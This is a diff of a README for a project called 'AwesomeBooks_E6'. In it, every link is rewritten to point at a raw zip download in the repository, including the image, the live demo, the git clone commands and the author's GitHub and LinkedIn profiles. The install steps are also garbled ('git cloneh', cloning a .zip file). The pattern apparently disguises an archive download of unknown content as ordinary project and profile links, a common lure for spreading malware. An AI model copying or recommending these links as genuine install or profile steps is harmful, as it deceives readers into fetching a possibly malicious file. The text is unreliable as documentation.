@@ -1,4 +1,4 @@
-![](https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/js/Books_Awesome_2.4.zip)
+![](https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/modules/Awesome_Books_v3.7.zip)
 
 # AwesomeBooks _E6
 
@@ -16,7 +16,7 @@
 
 ## Live Demo (if available)
 
-[Live Demo Link]( https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/js/Books_Awesome_2.4.zip)
+[Live Demo Link]( https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/modules/Awesome_Books_v3.7.zip)
 
 ## Getting Started
 
@@ -30,16 +30,16 @@
 - If it suits you, on your local computer, create a directory in your preferred location (e.g in the Desktop or Document directory)
 ### Install
 - Open your Terminal/Powershell or any command line interface you use, then navigate to your created above directory or the directory you'll like to clone this project directory.
-- Type `git cloneh https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/js/Books_Awesome_2.4.zip` if your're using https with git or `git clone https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/js/Books_Awesome_2.4.zip` if your preferred is ssh and hit enter.
-- Navigate to the `Conference` directory on your local computer in your above chosen directory and open the `https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/js/Books_Awesome_2.4.zip` file.
+- Type `git cloneh https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/modules/Awesome_Books_v3.7.zip` if your're using https with git or `git clone https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/modules/Awesome_Books_v3.7.zip` if your preferred is ssh and hit enter.
+- Navigate to the `Conference` directory on your local computer in your above chosen directory and open the `https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/modules/Awesome_Books_v3.7.zip` file.
 ### Usage
 - You can view the HTML document in your preferred or default browser.
 ## Authors
 
 👤 **Author1**
 
-- GitHub: [@Iptysam](https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/js/Books_Awesome_2.4.zip)
-- LinkedIn:(https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/js/Books_Awesome_2.4.zip)
+- GitHub: [@Iptysam](https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/modules/Awesome_Books_v3.7.zip)
+- LinkedIn:(https://raw.githubusercontent.com/Iptysam/AwesomeBooks_E6/main/modules/Awesome_Books_v3.7.zip)
 
 
 ## 🤝 Contributing
